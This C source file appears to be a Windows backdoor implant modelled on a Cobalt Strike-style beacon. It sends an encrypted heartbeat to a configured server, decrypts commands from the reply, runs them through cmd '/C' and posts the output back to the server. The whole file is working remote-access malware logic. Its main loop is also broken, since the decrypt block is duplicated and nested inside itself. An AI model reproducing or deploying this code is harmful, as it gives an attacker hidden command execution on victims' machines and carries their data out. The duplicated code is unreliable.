#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>

#include "../include/config.h"
#include "../include/network.h"
#include "../include/crypto.h"
#include "../include/utils.h"
#include "../include/command.h"

void InitHeartbeatPacket()
{
	DWORD *pdwSessionId = (DWORD *)(abHexData + 28);
	srand((unsigned int)time(NULL));
	DWORD dwRandomNumber = 32868254 + (rand() % 999) * 2;
	((unsigned char *)pdwSessionId)[0] = ((unsigned char *)&dwRandomNumber)[3];
	((unsigned char *)pdwSessionId)[1] = ((unsigned char *)&dwRandomNumber)[2];
	((unsigned char *)pdwSessionId)[2] = ((unsigned char *)&dwRandomNumber)[1];
	((unsigned char *)pdwSessionId)[3] = ((unsigned char *)&dwRandomNumber)[0];
	_itoa_s(dwRandomNumber, g_szSessionId, 20, 10);
	g_pPostData = (unsigned char *)malloc(257 + 20 + strlen(g_szSessionId));
	memcpy(g_pPostData, abPost0_0, 20);
	memcpy(g_pPostData + 20, g_szSessionId, strlen(g_szSessionId));
	memcpy(g_pPostData + 20 + strlen(g_szSessionId), abPost0_0 + 30, 257);
	g_nPostLen = 257 + 20 + strlen(g_szSessionId);
	int nEncryptedLength = PublicKeyEncrypt(abHexData, 83, abPublicKey, g_abEncryptedStr);

	char *szBase64Data = NULL;
	DWORD dwBase64DataLen = 0;
	Base64Encode(g_abEncryptedStr, nEncryptedLength, &szBase64Data, &dwBase64DataLen);

	Init(szBase64Data, dwBase64DataLen, szIpAddress, strlen(szIpAddress));
	free(szBase64Data);
}

int main()
{
	InitHeartbeatPacket();
	while (1)
	{
		char *pResponse = NULL;
		int nResponseSize = 0;
		int nResult = ConnectAndSend(szIpAddress, nPort, g_szHttp, g_nHttpLen, &pResponse, &nResponseSize);

		char *pCiphertextHex = NULL;
		char abEnd[] = {0x0d, 0x0a, 0x0d, 0x0a};
		char *pTemp = pResponse;
		int i = 0;
		for (i = 0; i < nResponseSize; i++)
		{
			if (memcmp((void *)pTemp, abEnd, 4) == 0)
			{
				pCiphertextHex = (char *)(pTemp + 4);
				break;
			}
			pTemp++;
		}

		if (pCiphertextHex == NULL)
		{
			goto clear;
		}
		int nRep = nResponseSize - i - 4;
		if (nRep == 0)
		{
			goto clear;
		}
		unsigned char *pDecryptedData = NULL;

		int nDecryptedDataLen = AesDecrypt((unsigned char *)pCiphertextHex, nRep, abAesKey, abCsFixedIV, &pDecryptedData);
		if (nDecryptedDataLen > 0x20)
		{
			char szCmd[] = "/C ";
			char *szCmdline = (char *)malloc(nDecryptedDataLen);
			memset(szCmdline, 0x00, nDecryptedDataLen);
			int nIndex = 0;
			int nDecryptedDataLen = AesDecrypt((unsigned char *)pCiphertextHex, nRep, abAesKey, abCsFixedIV, &pDecryptedData);
			if (nDecryptedDataLen > 0x20)
			{
				char szCmd[] = "/C ";
				char *szCmdline = (char *)malloc(nDecryptedDataLen);
				memset(szCmdline, 0x00, nDecryptedDataLen);
				int nIndex = 0;
				while (1)
				{
					if (memcmp(pDecryptedData + nIndex, szCmd, 3) == 0)
					{
						break;
					}

					nIndex++;
				}

				memcpy(szCmdline, pDecryptedData + nIndex, nDecryptedDataLen - nIndex);
				char *szOutputBuffer = (char *)malloc(INITIAL_BUFFER_SIZE);
				memset(szOutputBuffer, 0x00, 1024);
				DWORD dwBufferSize;
				DWORD dwExitCode;
				BOOL bSuccess = ExecuteCommand(szCmdline, &szOutputBuffer, &dwBufferSize, &dwExitCode);

				printf("%s : %s\n", szCmdline, szOutputBuffer);

				// 将命令执行结果发送到服务器
				PostResultAdvanced(szIpAddress, nPort, g_szSessionId, (unsigned char *)szOutputBuffer, strlen(szOutputBuffer));

				free(szCmdline);
				free(szOutputBuffer);
				free(pDecryptedData);
			}
			else
			{
				free(pDecryptedData);
			}

		clear:
			Sleep(nSleepTime);
			free(pResponse);
		}
	}
}